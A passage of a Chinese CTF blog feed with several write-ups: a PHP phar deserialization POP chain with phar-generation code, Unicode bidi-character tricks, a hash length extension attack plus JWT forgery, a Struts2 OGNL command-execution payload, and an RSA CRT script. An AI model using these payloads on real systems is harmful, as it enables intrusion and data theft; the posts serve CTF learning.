src="/img/image-20230806153232190.png"></p><p>下面的filename是可控的，并且很明显内容就是下载的文件，所以我们想着把所有功能的源代码进行下载。</p><p>但是，这里有一点小坑，就是它的index.php之类的文件并不是放在当前目录下的，而是上级目录的上级目录（试）</p><p>根据主页功能，猜测有上传、下载、删除、当然还有index.php</p><p><img src="/img/image-20230806154449471.png"></p><p>所以我们通过这个download.php将<strong>index.php,delete.php,download.php,upload.php,class.php(class.php是在index.php中的include中发现的)下载下来</strong></p><p>附上代码</p><h4 id="upload-php"><a href="#upload-php" class="headerlink" title="upload.php"></a>upload.php</h4><pre><code class="php">&lt;?phpsession_start();if (!isset($_SESSION[&#39;login&#39;])) &#123;    header(&quot;Location: login.php&quot;);    die();&#125;include &quot;class.php&quot;;if (isset($_FILES[&quot;file&quot;])) &#123;    $filename = $_FILES[&quot;file&quot;][&quot;name&quot;];    $pos = strrpos($filename, &quot;.&quot;);    if ($pos !== false) &#123;        $filename = substr($filename, 0, $pos);    &#125;        $fileext = &quot;.gif&quot;;    switch ($_FILES[&quot;file&quot;][&quot;type&quot;]) &#123;        case &#39;image/gif&#39;:            $fileext = &quot;.gif&quot;;            break;        case &#39;image/jpeg&#39;:            $fileext = &quot;.jpg&quot;;            break;        case &#39;image/png&#39;:            $fileext = &quot;.png&quot;;            break;        default:            $response = array(&quot;success&quot; =&gt; false, &quot;error&quot; =&gt; &quot;Only gif/jpg/png allowed&quot;);            Header(&quot;Content-type: application/json&quot;);            echo json_encode($response);            die();    &#125;    if (strlen($filename) &lt; 40 &amp;&amp; strlen($filename) !== 0) &#123;        $dst = $_SESSION[&#39;sandbox&#39;] . $filename . $fileext;        move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], $dst);        $response = array(&quot;success&quot; =&gt; true, &quot;error&quot; =&gt; &quot;&quot;);        Header(&quot;Content-type: application/json&quot;);        echo json_encode($response);    &#125; else &#123;        $response = array(&quot;success&quot; =&gt; false, &quot;error&quot; =&gt; &quot;Invaild filename&quot;);        Header(&quot;Content-type: application/json&quot;);        echo json_encode($response);    &#125;&#125;?&gt;</code></pre><h4 id="download-php"><a href="#download-php" class="headerlink" title="download.php"></a>download.php</h4><pre><code class="php">&lt;?phpsession_start();if (!isset($_SESSION[&#39;login&#39;])) &#123;    header(&quot;Location: login.php&quot;);    die();&#125;if (!isset($_POST[&#39;filename&#39;])) &#123;    die();&#125;include &quot;class.php&quot;;ini_set(&quot;open_basedir&quot;, getcwd() . &quot;:/etc:/tmp&quot;);chdir($_SESSION[&#39;sandbox&#39;]);$file = new File();$filename = (string) $_POST[&#39;filename&#39;];if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename) &amp;&amp; stristr($filename, &quot;flag&quot;) === false) &#123;    Header(&quot;Content-type: application/octet-stream&quot;);    Header(&quot;Content-Disposition: attachment; filename=&quot; . basename($filename));    echo $file-&gt;close();&#125; else &#123;    echo &quot;File not exist&quot;;&#125;?&gt;</code></pre><h4 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h4><pre><code class="php">&lt;?phpsession_start();if (!isset($_SESSION[&#39;login&#39;])) &#123;    header(&quot;Location: login.php&quot;);    die();&#125;?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;&gt;&lt;title&gt;网盘管理&lt;/title&gt;&lt;head&gt;    &lt;link href=&quot;static/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;    &lt;link href=&quot;static/css/panel.css&quot; rel=&quot;stylesheet&quot;&gt;    &lt;script src=&quot;static/js/jquery.min.js&quot;&gt;&lt;/script&gt;    &lt;script src=&quot;static/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;    &lt;script src=&quot;static/js/toast.js&quot;&gt;&lt;/script&gt;    &lt;script src=&quot;static/js/panel.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;    &lt;nav aria-label=&quot;breadcrumb&quot;&gt;    &lt;ol class=&quot;breadcrumb&quot;&gt;        &lt;li class=&quot;breadcrumb-item active&quot;&gt;管理面板&lt;/li&gt;        &lt;li class=&quot;breadcrumb-item active&quot;&gt;&lt;label for=&quot;fileInput&quot; class=&quot;fileLabel&quot;&gt;上传文件&lt;/label&gt;&lt;/li&gt;        &lt;li class=&quot;active ml-auto&quot;&gt;&lt;a href=&quot;#&quot;&gt;你好 &lt;?php echo $_SESSION[&#39;username&#39;]?&gt;&lt;/a&gt;&lt;/li&gt;    &lt;/ol&gt;&lt;/nav&gt;&lt;input type=&quot;file&quot; id=&quot;fileInput&quot; class=&quot;hidden&quot;&gt;&lt;div class=&quot;top&quot; id=&quot;toast-container&quot;&gt;&lt;/div&gt;&lt;?phpinclude &quot;class.php&quot;;$a = new FileList($_SESSION[&#39;sandbox&#39;]);$a-&gt;Name();$a-&gt;Size();?&gt;</code></pre><p>在index.php中可以发现</p><pre><code class="php">include &quot;class.php&quot;;</code></pre><h4 id="class-php"><a href="#class-php" class="headerlink" title="class.php"></a>class.php</h4><pre><code class="php">&lt;?phperror_reporting(0);$dbaddr = &quot;127.0.0.1&quot;;$dbuser = &quot;root&quot;;$dbpass = &quot;root&quot;;$dbname = &quot;dropbox&quot;;$db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname);class User &#123;    public $db;    public function __construct() &#123;        global $db;        $this-&gt;db = $db;    &#125;    public function user_exist($username) &#123;        $stmt = $this-&gt;db-&gt;prepare(&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;);        $stmt-&gt;bind_param(&quot;s&quot;, $username);        $stmt-&gt;execute();        $stmt-&gt;store_result();        $count = $stmt-&gt;num_rows;        if ($count === 0) &#123;            return false;        &#125;        return true;    &#125;    public function add_user($username, $password) &#123;        if ($this-&gt;user_exist($username)) &#123;            return false;        &#125;        $password = sha1($password . &quot;SiAchGHmFx&quot;);        $stmt = $this-&gt;db-&gt;prepare(&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;);        $stmt-&gt;bind_param(&quot;ss&quot;, $username, $password);        $stmt-&gt;execute();        return true;    &#125;    public function verify_user($username, $password) &#123;        if (!$this-&gt;user_exist($username)) &#123;            return false;        &#125;        $password = sha1($password . &quot;SiAchGHmFx&quot;);        $stmt = $this-&gt;db-&gt;prepare(&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;);        $stmt-&gt;bind_param(&quot;s&quot;, $username);        $stmt-&gt;execute();        $stmt-&gt;bind_result($expect);        $stmt-&gt;fetch();        if (isset($expect) &amp;&amp; $expect === $password) &#123;            return true;        &#125;        return false;    &#125;    public function __destruct() &#123;        $this-&gt;db-&gt;close();    &#125;&#125;class FileList &#123;    private $files;    private $results;    private $funcs;    public function __construct($path) &#123;        $this-&gt;files = array();        $this-&gt;results = array();        $this-&gt;funcs = array();        $filenames = scandir($path);        $key = array_search(&quot;.&quot;, $filenames);        unset($filenames[$key]);        $key = array_search(&quot;..&quot;, $filenames);        unset($filenames[$key]);        foreach ($filenames as $filename) &#123;            $file = new File();            $file-&gt;open($path . $filename);            array_push($this-&gt;files, $file);            $this-&gt;results[$file-&gt;name()] = array();        &#125;    &#125;    public function __call($func, $args) &#123;        array_push($this-&gt;funcs, $func);        foreach ($this-&gt;files as $file) &#123;            $this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();        &#125;    &#125;    public function __destruct() &#123;        $table = &#39;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#39;;        $table .= &#39;&lt;thead&gt;&lt;tr&gt;&#39;;        foreach ($this-&gt;funcs as $func) &#123;            $table .= &#39;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#39; . htmlentities($func) . &#39;&lt;/th&gt;&#39;;        &#125;        $table .= &#39;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#39;;        $table .= &#39;&lt;/thead&gt;&lt;tbody&gt;&#39;;        foreach ($this-&gt;results as $filename =&gt; $result) &#123;            $table .= &#39;&lt;tr&gt;&#39;;            foreach ($result as $func =&gt; $value) &#123;                $table .= &#39;&lt;td class=&quot;text-center&quot;&gt;&#39; . htmlentities($value) . &#39;&lt;/td&gt;&#39;;            &#125;            $table .= &#39;&lt;td class=&quot;text-center&quot; filename=&quot;&#39; . htmlentities($filename) . &#39;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;下载&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;删除&lt;/a&gt;&lt;/td&gt;&#39;;            $table .= &#39;&lt;/tr&gt;&#39;;        &#125;        echo $table;    &#125;&#125;class File &#123;    public $filename;    public function open($filename) &#123;        $this-&gt;filename = $filename;        if (file_exists($filename) &amp;&amp; !is_dir($filename)) &#123;            return true;        &#125; else &#123;            return false;        &#125;    &#125;    public function name() &#123;        return basename($this-&gt;filename);    &#125;    public function size() &#123;        $size = filesize($this-&gt;filename);        $units = array(&#39; B&#39;, &#39; KB&#39;, &#39; MB&#39;, &#39; GB&#39;, &#39; TB&#39;);        for ($i = 0; $size &gt;= 1024 &amp;&amp; $i &lt; 4; $i++) $size /= 1024;        return round($size, 2).$units[$i];    &#125;    public function detele() &#123;        unlink($this-&gt;filename);    &#125;    public function close() &#123;        return file_get_contents($this-&gt;filename);    &#125;&#125;?&gt;</code></pre><p>这里面我们发现了一堆类的定义和一个重要的漏洞点<a href="https://www.runoob.com/php/func-filesystem-file-get-contents.html">file_get_contents()</a></p><pre><code class="php">  public function close() &#123;        return file_get_contents($this-&gt;filename);    &#125;</code></pre><p>并且它并没有对这里的文件流进行相关的过滤和限制，所以我们的<strong>核心点</strong>是通过这个函数来达成文件内容获取的作用。</p><p>那么我们需要怎么实现这个效果呢。</p><p>我们在上去看类中的相关代码。</p><p>我们可以看到有序列化的相关特征魔术方法，如__call(),<strong>这个方法是在对象上下文中调用不可访问的方法触发</strong></p><p>我们在关注到<strong>User类</strong>中的__desturcut()，发现这里调用了close()方法，而这个方法正是指向了我们所说的<strong>file_get_content()</strong></p><pre><code class="php">public function __destruct() &#123;        $this-&gt;db-&gt;close();    &#125;</code></pre><p>此时我们就有了简单而基础的逻辑，就是从<strong>User-&gt;destruct()&#x3D;&gt;File-&gt;close()</strong></p><p>但是这时候我们又会发现，没有回现。</p><p>此时我们回过头来看之前<code>__class()</code>方法中的内容，发现它就是遍历files数组，并且对每一个变量执行一次$func函数，然后将结果存进$result中，然后代码执行结束时，FileList中的<code>__destruct()</code>会执行其内部的代码，将result的结果进行回显。</p><pre><code class="php"> public function __call($func, $args) &#123;        array_push($this-&gt;funcs, $func);        foreach ($this-&gt;files as $file) &#123;            $this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();        &#125;    &#125;</code></pre><p>此时我们的思路又更加清晰了一些，变为了<strong>User-&gt;destruct()&#x3D;&gt;FileList-&gt;call()&#x3D;&gt;File-&gt;close()&#x3D;&gt;FileList-&gt;destruct()</strong></p><p>但是此时我们又会发现，那要怎么出发这个User的destrcut呢</p><p>那这里我们就要用到delete.php这个所实现的功能了</p><h4 id="delete-php"><a href="#delete-php" class="headerlink" title="delete.php"></a>delete.php</h4><pre><code class="php">&lt;?phpsession_start();if (!isset($_SESSION[&#39;login&#39;])) &#123;    header(&quot;Location: login.php&quot;);    die();&#125;if (!isset($_POST[&#39;filename&#39;])) &#123;    die();&#125;include &quot;class.php&quot;;chdir($_SESSION[&#39;sandbox&#39;]);$file = new File();$filename = (string) $_POST[&#39;filename&#39;];if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename)) &#123;    $file-&gt;detele();    Header(&quot;Content-type: application/json&quot;);    $response = array(&quot;success&quot; =&gt; true, &quot;error&quot; =&gt; &quot;&quot;);    echo json_encode($response);&#125; else &#123;    Header(&quot;Content-type: application/json&quot;);    $response = array(&quot;success&quot; =&gt; false, &quot;error&quot; =&gt; &quot;File not exist&quot;);    echo json_encode($response);&#125;?&gt;</code></pre><p>我们可以发现，它进行了一个$file-&gt;delete()操作</p><pre><code class="php">if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename)) &#123;    $file-&gt;detele();       .....       .....    </code></pre><p>然后在class.php中呈现就是执行了<a href="https://www.runoob.com/php/func-filesystem-unlink.html">unlink</a>函数，而这个函数作用就是删除文件的作用。</p><pre><code class="php"> public function detele() &#123;        unlink($this-&gt;filename);    &#125;</code></pre><p>所以我们此时想必已经豁然开朗。简单讲就是用delete来触发destrcut，然后执行上面的pop链。<br>此时我们就可以开始构造pop链了，如下：</p><h3 id="POP"><a href="#POP" class="headerlink" title="POP"></a>POP</h3><pre><code class="php">&lt;?phpclass User &#123;    public $db;    public function __construct()&#123;        $this-&gt;db=new FileList();    &#125;&#125;class FileList &#123;    private $files;    private $results;    private $funcs;    public function __construct()&#123;        $this-&gt;files=array(new File());        $this-&gt;results=array();        $this-&gt;funcs=array();    &#125;&#125;class File &#123;    public $filename=&quot;/flag.txt&quot;;&#125;$user = new User();$phar = new Phar(&quot;shell.phar&quot;); //生成一个phar文件，文件名为shell.phar$phar-&gt; startBuffering();$phar-&gt;setStub(&quot;GIF89a&lt;?php __HALT_COMPILER();?&gt;&quot;); //设置stub$phar-&gt;setMetadata($user); //将对象user写入到metadata中$phar-&gt;addFromString(&quot;shell.txt&quot;,&quot;haha&quot;); //添加压缩文件，文件名字为shell.txt,内容为haha$phar-&gt;stopBuffering();</code></pre><p><strong>默认生成Phar文件会报错，php默认设置Phar为只读，需要改php.ini设置，在demo有</strong></p><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>然后将生成的文件上传，然后执行删除操作时添加<code>phar://</code>，就可以得到flag了。</p><p><del>(至于为什么是flag.txt文件而不是flag.php文件，我觉得以后就都试试吧，虽然我这里也是看了其它师傅的wp才知道的)</del></p><p>​<img src="/img/image-20230806165603102.png"></p><p>需要抓包更改其Content-Type为image&#x2F;jpeg或其它图片格式的对应字符串</p><p><img src="/img/image-20230806165638476.png"></p><p><img src="/img/image-20230806165912218.png"></p><p>over</p><p><a href="http://home.ustc.edu.cn/~xjyuan/blog/2019/11/13/phar-unserialize/#0x00-phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">come from1</a></p><p><a href="https://blog.csdn.net/SHININGENDING/article/details/124368489">come from2</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> STUDY </category>
          
          <category> WEB </category>
          
          <category> 反序列化 </category>
          
          <category> Phar </category>
          
      </categories>
      
      
        <tags>
            
            <tag> unserialize </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>checkin</title>
      <link href="/2023/07/30/checkin/"/>
      <url>/2023/07/30/checkin/</url>
      
        <content type="html"><![CDATA[<h2 id="NISACTF-2022-checkin"><a href="#NISACTF-2022-checkin" class="headerlink" title="[NISACTF 2022]checkin"></a>[NISACTF 2022]checkin</h2><p>Unicode编码，很有意思的一道题</p><p>其实是一道哲理题</p><p><strong>眼见不一定为实</strong></p><p><img src="/img/image-20230607193929236.png"></p><p>看起来特别basic的一道题</p><p>但是发现直接get传参啥也没有</p><p>发现</p><p>复制下来和截图有一些区别</p><p>复制源码为php文件010打开分析,找一找不可见字符，这就不怕被骗了</p><p>这时候会发现有一些特殊的字符</p><p>真正的变量和传参就有了，把十六进制复制下来前面加上%就是url编码</p><p><img src="/img/image-20230607200644428.png"></p><p>jitanglailo和ahhah是没有什么特别的地方</p><pre><code>E2 80 AE E2 81 A6 55 67 65 69 77 6F E2 81 A9 E2 81 A6 63 75 69 73 68 69 79 75 61 6E</code></pre><pre><code>%E2%80%AE%E2%81%A6%55%67%65%69%77%6F%E2%81%A9%E2%81%A6%63%75%69%73%68%69%79%75%61%6E</code></pre><pre><code>E2 80 AE E2 81 A6 20 46 6C 61 67 21 E2 81 A9 E2 81 A6 4E 31 53 41 43 54 46</code></pre><pre><code>%E2%80%AE%E2%81%A6%20%46%6C%61%67%21%E2%81%A9%E2%81%A6%4E%31%53%41%43%54%46</code></pre><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a><strong>payload</strong></h2><pre><code>?ahahahaha=jitanglailo&amp;%E2%80%AE%E2%81%A6%55%67%65%69%77%6F%E2%81%A9%E2%81%A6%63%75%69%73%68%69%79%75%61%6E=%E2%80%AE%E2%81%A6%20%46%6C%61%67%21%E2%81%A9%E2%81%A6%4E%31%53%41%43%54%46</code></pre><p><strong>感觉特别有趣就看了看别的师傅的wp进行了下原理分析</strong></p><p>这题有几个异常的地方</p><p>首先打payload复制的时候（为什么不手打，当然不是因为懒</p><p>选中部分字符，其余未被选中的字符也被选中了</p><p>注释的那几个颜色也不一样</p><p>在选中$GET[duishiyuan]</p><p>的$GET[与d之间时，会同时选中后面的部分</p><p>所以在[和d之间有特殊字符搞怪</p><p>拿下面这一段解释前先看几个特殊字符</p><pre><code>E2 80 AE E2 81 A6 4E 49 53 41 43 54 46 E2 81 A9 E2 81 A6 57 65 6C 63 6F 6D 65 20 74 6F</code></pre><p>看这几个特殊字符</p><h2 id="E2-80-AE"><a href="#E2-80-AE" class="headerlink" title="E2 80 AE"></a><strong>E2 80 AE</strong></h2><p>对于这个特殊字符，它是Unicode编码U+202E转UTF-8对应的十六进制编码</p><p>名字叫<strong>从右往左强制符</strong></p><p>作用就是：根据内存顺序<strong>从右至左</strong>显示字符</p><p>这个字符后面的会反过来显示</p><p>比如</p><pre><code class="python">print(&quot;abc&quot;+u&quot;\u202e&quot;+&quot;def&quot;)</code></pre><p>输出abcfed</p><p>选中abcf时会选中ed</p><p><img src="/img/image-20230607202719488.png"></p><h2 id="E2-81-A6"><a href="#E2-81-A6" class="headerlink" title="E2 81 A6"></a><strong>E2 81 A6</strong></h2><p>它的unicode编号是：</p><pre><code>U+2066</code></pre><p>作用就是这之间的字符从左到右显示，不影响外围字符</p><h2 id="E2-81-A9"><a href="#E2-81-A9" class="headerlink" title="E2 81 A9"></a><strong>E2 81 A9</strong></h2><pre><code>U+2069</code></pre><p>作为<code>RLI、LRI、FSi</code>翻转结束的标识</p><p>作用是分隔两个文本方向不同的字符</p><blockquote><p>U+2069是Unicode字符集中的一个控制字符，称为“隔离符号（isolate）”。它的作用是分隔两个文本方向不同的字符，例如将一个从右向左书写的阿拉伯语单词与一个从左向右书写的英语单词分开。隔离符号可以确保文本方向正确，并且不会影响字符之间的排版。在实际应用中，隔离符号一般不会直接输入，而是由输入法或排版软件自动添加。</p></blockquote><p>其实就是分离两部分</p><p>分析一下</p><pre><code>E2 80 AE E2 81 A6 4E 49 53 41 43 54 46 E2 81 A9 E2 81 A6 57 65 6C 63 6F 6D 65 20 74 6F</code></pre><p>其实是</p><pre><code>E2 80 AE E2 81 A6 NISACTFE2 81 A9 E2 81 A6Welcome to</code></pre><p>浏览器进行解析的时候，是按照上方十六进制的顺序进行解析的，但是解析之后的输出就要按照具体情况定了</p><p>首先浏览器解析到<strong>E2 80 AE</strong>的时候它知道后面的要从右往左输出，当解析到<strong>E2 81 A6</strong>时它知道要从左往右输出字符</p><p>这个时候NISACTFE还是NISACTFE不会变，当解析完Welcome to后便会把这俩顺序颠倒输出（这里是U+2069也就是E2 81 A9的作用）</p><pre><code>Welcome toNISACTFE</code></pre><p><a href="https://www.xiinnn.com/article/22d50835.html">参考</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> STUDY </category>
          
          <category> WEB </category>
          
          <category> Unicode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Unicode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Jwt&amp;struts2</title>
      <link href="/2023/07/29/jwtstruts/"/>
      <url>/2023/07/29/jwtstruts/</url>
      
        <content type="html"><![CDATA[<h1 id="ctf-jwt2struts"><a href="#ctf-jwt2struts" class="headerlink" title="ctf-jwt2struts"></a>ctf-jwt2struts</h1><p>记录一下</p><p>打开发现，猜测为jwt伪造</p><blockquote><p>You are now logged in as user. Try to become admin.</p></blockquote><p>CTRL+U</p><blockquote><p>JWT_key.php</p></blockquote><p>第一个知识点，想办法拿到Jwt伪造的key</p><pre><code class="php">&lt;?phphighlight_file(__FILE__);include &quot;./secret_key.php&quot;;include &quot;./salt.php&quot;;//$salt = XXXXXXXXXXXXXX // the salt include 14 characters//md5($salt.&quot;adminroot&quot;)=e6ccbf12de9d33ec27a5bcfb6a3293df@$username = urldecode($_POST[&quot;username&quot;]);@$password = urldecode($_POST[&quot;password&quot;]);if (!empty($_COOKIE[&quot;digest&quot;])) &#123;    if ($username === &quot;admin&quot; &amp;&amp; $password != &quot;root&quot;) &#123;         if ($_COOKIE[&quot;digest&quot;] === md5($salt.$username.$password)) &#123;            die (&quot;The secret_key is &quot;. $secret_key);        &#125;        else &#123;            die (&quot;Your cookies don&#39;t match up! STOP HACKING THIS SITE.&quot;);        &#125;    &#125;    else &#123;        die (&quot;no no no&quot;);    &#125;&#125;</code></pre><p>这是一个</p><h2 id="哈希长度扩展攻击"><a href="#哈希长度扩展攻击" class="headerlink" title="哈希长度扩展攻击"></a>哈希长度扩展攻击</h2><p>用工具<a href="https://github.com/bwall/HashPump">hashpump</a></p><pre><code class="sh">$ git clone https://github.com/bwall/HashPump.git$ apt-get install g++ libssl-dev$ cd HashPump$ make$ make install$ ./hashpump</code></pre><blockquote><p>input Signature&#x3D; e6ccbf12de9d33ec27a5bcfb6a3293df  &#x2F;&#x2F;这里填已经有的hash值</p><p>input  Data&#x3D;adminroot  &#x2F;&#x2F;这里填已知的，也就是你要上传的</p><p>input Key&#x3D;14  &#x2F;&#x2F;这里填未知的密文长度，题目给了14</p><p>input Data to Add&#x3D;  abcd &#x2F;&#x2F;这里填你自己要添加的字符串，长度尽量大于2</p></blockquote><p><img src="/img/jwtstruts21.png"></p><p>把\x替换为%</p><p>因为</p><pre><code class="php">@$username = urldecode($_POST[&quot;username&quot;]);@$password = urldecode($_POST[&quot;password&quot;]);</code></pre><p>password进行了一次url解码，我们要先提前对它进行一次url编码</p><pre><code>root%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%b8%00%00%00%00%00%00%00abcd</code></pre><p>编码后为</p><pre><code>root%2580%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%25b8%2500%2500%2500%2500%2500%2500%2500abcd</code></pre><p>payload</p><p><img src="/img/jwtstruts22.png"></p><p>拿到key</p><blockquote><p>sk-he00lctf3r</p></blockquote><p>抓包原页面拿session</p><p><a href="https://jwt.io/">jwt</a></p><p><img src="/img/jwtstruts23.png"></p><p>在”your-256-bit-secret”处放入你的key</p><p>修改明文，可以拿到加密后的session</p><p><img src="/img/jwtstruts24.png"></p><p>修改session放包，发现页面自动跳转到&#x2F;admiiiiiiiiiiin&#x2F;</p><pre><code>&lt;title&gt;do you know struts2?</code></pre><p>看名字可以知道是</p><h2 id="struts2"><a href="#struts2" class="headerlink" title="struts2"></a>struts2</h2><p><a href="https://blog.csdn.net/qq_52527336/article/details/125533839">struts2</a></p><p><del>还没学后期补上</del></p><p>虽然不会但是有payload</p><p>flag在环境变量里可以找到，原来的文件…..可能没有，可能没有了</p><pre><code>&#39; + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#foo=new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;env&#39;).getInputStream())) + &#39;</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> STUDY </category>
          
          <category> WEB </category>
          
          <category> JWT </category>
          
      </categories>
      
      
        <tags>
            
            <tag> unserialize </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CRT</title>
      <link href="/2023/07/23/CRT/"/>
      <url>/2023/07/23/CRT/</url>
      
        <content type="html"><![CDATA[<h2 id="中国剩余定理-CRT"><a href="#中国剩余定理-CRT" class="headerlink" title="中国剩余定理(CRT)"></a>中国剩余定理(CRT)</h2><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>中国剩余定理又称孙子定理或中国余数定理，是<strong>数论中的一个关于一元线性同余方程组的定理，说明了一元线性同余方程组有解的准则以及求解方法</strong>。在古代称为孙子定理、鬼谷算、秦王暗点兵、物不知数等。</p><h3 id="中国剩余定理求解方法"><a href="#中国剩余定理求解方法" class="headerlink" title="中国剩余定理求解方法"></a>中国剩余定理求解方法</h3><p>提出一个问题</p><blockquote><p>有物不知其数，三三数之剩二，五五数之剩三，七七数之剩二。问物几何？</p></blockquote><p>大概意思：一个整数除以三余二，除以五余三，除以七余二，求这个整数。</p><p>一个解答</p><blockquote><p>三人同行七十希，五树梅花廿一支，七子团圆正半月，除百零五便得知</p></blockquote><p>这句话的意思就是除以三的余数乘七十，除以五的余数乘二十一，除以七余数乘十五，得到的结果就是即为加上一百零五的整数倍。</p><p>使用中国剩余定理对“物不知其数”该问题进行解答，列出来线性同余方程组如下：</p><h4 id="1-除以三余二"><a href="#1-除以三余二" class="headerlink" title="1.除以三余二"></a>1.除以三余二</h4><p>我们可以先找出一个整数a除以三等于一，除以五等于零，除以七等于零</p><blockquote><p>5*7&#x3D;35：35的倍数即可以保证除以五等于零，除以七等于零。 </p><p>35（mod3）&#x3D;2 </p><p>35×2（mod3）&#x3D;1</p></blockquote><p>即该整数a为70 这也就是“三人同行七十希”</p><blockquote><p>70（mod3）&#x3D;1 </p><p>70（mod5）&#x3D;0 </p><p>70（mod7）&#x3D;0</p></blockquote><p>则”除以三等于二，除以五等于零，除以七等于零“的整数a‘即为70×除于三的余数：即70×2&#x3D;140</p><blockquote><p>140（mod3）&#x3D;2 </p><p>140（mod5）&#x3D;0 </p><p>140（mod7）&#x3D;0</p></blockquote><h4 id="2-除以五余三"><a href="#2-除以五余三" class="headerlink" title="2.除以五余三"></a>2.除以五余三</h4><p>我们可以先找出一个整数b除以五等于一，除以三等于零，除以七等于零</p><blockquote><p>3*7&#x3D;21：21的倍数即可以保证除以三等于零，除以七等于零。<br>21（mod5）&#x3D;1</p></blockquote><p>即该整数a为21<br> 这也就是“五树梅花廿一支”</p><blockquote><p>21（mod3）&#x3D;0<br> 21（mod5）&#x3D;1<br> 21（mod7）&#x3D;0</p></blockquote><p>则”除以五等于三，除以三等于零，除以七等于零“的整数b‘即为21×除于五的余数：即21×3&#x3D;63</p><blockquote><p>63（mod3）&#x3D;0<br> 63（mod5）&#x3D;3<br> 63（mod7）&#x3D;0</p></blockquote><h4 id="3-除以七余二"><a href="#3-除以七余二" class="headerlink" title="3.除以七余二"></a>3.除以七余二</h4><p>我们可以先找出一个整数c除以七等于一，除以三等于零，除以五等于零</p><blockquote><p>3*5&#x3D;15：15的倍数即可以保证除以三等于零，除以七等于零。<br> 15（mod7）&#x3D;1</p></blockquote><p>即该整数c为15<br> 这也就是“七子团圆正半月“</p><blockquote><p>15（mod3）&#x3D;0<br>15（mod5）&#x3D;0<br>15（mod7）&#x3D;1</p></blockquote><p>则”除以七等于二，除以三等于零，除以七等于零“的整数c‘即为15×除于五的余数：即15×2&#x3D;30</p><blockquote><p>30（mod3）&#x3D;0<br> 30（mod5）&#x3D;0<br> 30（mod7）&#x3D;2</p></blockquote><h4 id="4-结论"><a href="#4-结论" class="headerlink" title="4.结论"></a>4.结论</h4><p>最后的解为：a‘+b’+c’&#x3D;140+63+30&#x3D;233<br> 3、5、7的最小公倍数为105</p><blockquote><p>即该解为：233+n×105<br>n最小为-2：此时最小的正整数解为23</p></blockquote><p>用现代数学的语言来说明的话，中国剩余定理给出了以下的一元线性同余方程组：</p><p>假设整数n1,n2,n3…nk两两互素，则对于任意的整数x，满足以如下方程组。则：</p><p><img src="/img/00-01-1.png"></p><h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><p>一般n和c的对数就是e的大小</p><pre><code>import gmpy2from functools import reducefrom Crypto.Util.number import long_to_bytes# 中国剩余定理def CRT(cipher, n):    N = reduce(lambda x, y: x * y, (i for i in n))    result = 0    data = zip(cipher, n)    for ci, ni in data:        Ni = N // ni        di = gmpy2.invert(Ni, ni)        result += ci * Ni * di    return result % N, N# 读入 e, n, ce = c = []n = []x, N = CRT(c, n)m = gmpy2.iroot(gmpy2.mpz(x), e)[0]print(m)print(long_to_bytes(m))</code></pre><p><a href="https://blog.csdn.net/qq_43589852/article/details/128469183">参考1</a></p><p><a href="https://blog.csdn.net/ChaoYue_miku/article/details/125767969">脚本参考</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> STUDY </category>
          
          <category> CRYPTO </category>
          
          <category> RSA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP反序列化字符串逃逸</title>
      <link href="/2023/07/23/strout/"/>
      <url>/2023/07/23/strout/</url>
      
